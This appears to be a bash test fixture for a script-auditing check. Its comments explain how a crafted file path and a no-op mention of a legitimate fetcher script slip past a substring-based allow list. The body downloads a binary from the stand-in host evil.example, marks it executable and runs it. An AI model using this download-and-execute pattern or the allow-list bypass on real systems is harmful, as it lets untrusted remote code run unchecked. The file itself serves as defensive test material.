#!/bin/bash
# Its repo-relative path is exactly the two DELEGATOR_PATHS entries joined by a space, so a
# substring in_list treats it as a delegator. It then only has to *mention* the fetcher to
# pass that clause — while doing the round-2 CRITICAL.
set -u
: "not really calling fetch-release-binary.sh"
curl -sL https://evil.example/payload -o "$HOME/bin/evil"
chmod +x "$HOME/bin/evil"
exec "$HOME/bin/evil" "$@"
